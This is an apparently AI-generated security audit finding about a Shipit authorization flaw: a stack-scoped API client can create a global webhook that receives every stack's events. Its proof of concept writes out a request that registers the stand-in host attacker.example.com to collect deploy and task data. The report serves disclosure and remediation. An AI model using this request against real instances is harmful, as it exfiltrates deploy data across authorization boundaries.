Confirmed: `Hook.for_stack(stack_id)` uses `where(stack_id: [nil, stack_id])` — global hooks (`stack_id: nil`) are delivered on **every** stack's events [1](#0-0) , which matches the binding break described below.

### Title
Stack-scoped `ApiClient` with `write:hook` can create a global webhook receiving all stacks' events - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController` derives the `stack_id` used to scope a `Hook` purely from whether `params[:stack_id]` is present in the request path, not from the authenticated `ApiClient`'s own `stack_id` restriction. Because the engine also exposes a non-nested `resources :hooks` route with no `stack_id` param, a token that is supposed to be authorized only for one stack (`ApiClient.stack_id`) can hit that global endpoint and create a `Hook` with `stack_id: nil`, which `Hook.for_stack` subsequently matches against every stack's `stack`, `deploy`, `rollback`, `lock`, `commit_status`, `merge`, `pull_request`, and `task` events.

### Finding Description
`ApiClient` can be scoped to a single stack via the optional `stack` association, and `Api::BaseController#stacks` enforces this scope for stack-nested resources: `current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all` [2](#0-1) . Authorization for hooks, however, is checked only via `permissions.include?("#{operation}:#{scope}")` in `ApiClient#check_permissions!`, with no cross-check against `stack_id` [3](#0-2) .

`Api::HooksController` computes the query scope for hooks from the request path, not from the client's authorized stack:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [4](#0-3) 

`config/routes.rb` mounts hooks both nested under a stack (`/api/stacks/*stack_id/hooks`) and as a top-level, non-nested collection (`resources :hooks, only: %i[index create show update destroy]`) [5](#0-4) . On the top-level route there is no `stack_id` param, so `stack_id` evaluates to `nil` and `hooks.create(params)` persists a `Hook` with `stack_id: nil` — a *global* hook, per the `scope :global, -> { where(stack_id: nil) }` declaration [6](#0-5) .

Delivery selection for any given stack event uses `Hook.for_stack(stack_id)`, defined as `where(stack_id: [nil, stack_id])` [7](#0-6) , meaning a global hook (`stack_id: nil`) is delivered for **every** stack's events, not just the one the creating `ApiClient` was scoped to.

This is the same class of bug as the reported `getAllocations()` flaw: a binding the system is meant to enforce — *the stack an `ApiClient` token authorizes* — is never actually checked at the point where the write (`Hook` creation) determines *the stack(s) it touches*. The `write:hook` permission proves the client may write hooks, but nothing ties that permission to the specific stack the client is scoped to.

### Impact Explanation
An `ApiClient` provisioned by an administrator with `stack_id` set (intending to restrict it to one stack, e.g. via the "read:hook"/"write:hook" permission for that team's automation) and granted `write:hook` can call `POST /api/hooks` (unscoped) instead of `POST /api/stacks/<their-stack>/hooks`. This creates a global `Hook` that will receive delivery payloads for `deploy`, `rollback`, `task`, `merge`, `pull_request`, `commit_status`, and `lock` events across **every stack in the Shipit instance**, including stacks the client was never authorized to read. This is an unauthenticated-by-scope read of stack state/task/deploy output for repositories outside the client's authorized boundary — matching the High-impact criterion "escalation into authorization... unauthenticated read of stack state, task streams or deploy output."

### Likelihood Explanation
Requires possession of a valid `ApiClient` token with `write:hook` permission (a legitimately-issued, stack-scoped credential) — no additional privilege or secret is needed beyond what the client was already issued for its intended single-stack use case. The bypass is a single unscoped API call; no timing or race condition is required. Likelihood is moderate-to-high wherever stack-scoped API clients with `write:hook` are issued to less-trusted integrations/teams.

### Recommendation
In `Api::HooksController`, derive and enforce hook scope from `current_api_client.stack_id` (when the client is stack-scoped) rather than solely from the URL path, and reject (403/422) any attempt by a stack-scoped client to create/read/update/destroy a global (`stack_id: nil`) hook. Alternatively, require `write:hook` combined with an explicit `global:hook`-type permission (or superuser flag) before permitting `stack_id: nil` creation, and validate on `create`/`update` that `params[:stack_id]` (if present) matches `current_api_client.stack_id` when the client is scoped.

### Proof of Concept
1. Admin creates an `ApiClient` "team-a-bot" with `stack: TeamAStack` and permissions `['read:stack', 'write:hook']`, intending it to manage hooks only for `TeamAStack`.
2. Attacker (or the automation credential holder) uses that token to call:
   `POST /api/hooks` with body `{ "delivery_url": "https://attacker.example.com/collect", "events": ["deploy","task","commit_status","pull_request"] }` — note: no `stack_id` in the path.
3. `Api::BaseController#authenticate_api_client` accepts the token; `HooksController#stack_id` returns `nil` because `params[:stack_id]` is absent; `Hook.create` persists a hook with `stack_id: nil`.
4. From then on, `Hook.deliver` / `Hook.for_stack(any_stack_id)` matches this hook for every stack's `deploy`, `task`, `pull_request`, etc. events [8](#0-7) , exfiltrating deploy/task metadata for stacks outside `TeamAStack` to `attacker.example.com`, despite the issuing token being scoped to a single stack.

**Uncertainty note:** I was not able to fully verify from the index whether the UI-level `ApiClientsController` (`app/controllers/shipit/api_clients_controller.rb`) enforces that `write:hook` is only ever granted alongside a `nil` `stack` (i.e., that "global hook" capability is an intentional design point restricted to unscoped clients). The `create_params`/`update_params` methods shown do not perform such a check [9](#0-8) , but a Devin session with full repo access should double-check any view-layer restrictions on the "new/edit API client" form and any model-level validation on `ApiClient` before finalizing remediation.
